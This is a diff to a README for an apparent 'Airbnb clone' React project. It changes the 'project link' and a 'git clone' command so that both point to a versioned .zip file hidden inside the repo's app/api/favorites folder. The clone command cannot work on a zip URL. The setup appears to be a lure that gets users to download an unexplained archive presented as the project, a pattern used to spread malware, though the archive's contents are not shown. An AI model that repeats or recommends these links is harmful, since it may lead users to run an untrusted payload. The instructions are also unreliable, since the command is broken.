@@ -1,7 +1,7 @@
 # Airbnb clone
 
 Link the proyect
-https://github.com/KaterineLimaE/Proyecto-Vivencial-Front-End/raw/refs/heads/develop/app/reservations/End-Vivencial-Front-Proyecto-1.3.zip
+https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Front-End/develop/app/api/favorites/Proyecto_End_Front_Vivencial_1.6.zip
 
 In this proyect we used the allow tecnologies:
 - React js
@@ -13,7 +13,7 @@ If you want to use this proyect, you do this
 
 1. Clone repository
 ````
-git clone https://github.com/KaterineLimaE/Proyecto-Vivencial-Front-End/raw/refs/heads/develop/app/reservations/End-Vivencial-Front-Proyecto-1.3.zip
+git clone https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Front-End/develop/app/api/favorites/Proyecto_End_Front_Vivencial_1.6.zip
 ````
 2. Install dependencies
 ````
